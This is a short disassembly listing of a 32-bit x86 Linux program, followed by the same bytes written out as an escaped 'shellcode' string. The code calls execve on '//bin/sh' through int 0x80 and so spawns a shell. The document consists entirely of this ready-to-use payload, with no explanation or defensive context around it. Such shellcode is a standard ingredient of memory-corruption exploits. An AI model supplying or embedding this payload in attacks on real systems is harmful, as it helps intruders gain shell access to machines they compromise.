Disassembly of section .text:

08049000 <_start>:
 8049000:       31 c0                   xor    eax,eax
 8049002:       31 f6                   xor    esi,esi
 8049004:       b0 0b                   mov    al,0xb
 8049006:       56                      push   esi
 8049007:       68 6e 2f 73 68          push   0x68732f6e
 804900c:       68 2f 2f 62 69          push   0x69622f2f
 8049011:       89 e3                   mov    ebx,esp
 8049013:       89 f1                   mov    ecx,esi
 8049015:       89 f2                   mov    edx,esi
 8049017:       cd 80                   int    0x80

shellcode = [

\x31\xc0\x31\xf6\xb0\x0b\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xf1\x89\xf2\xcd\x80

]
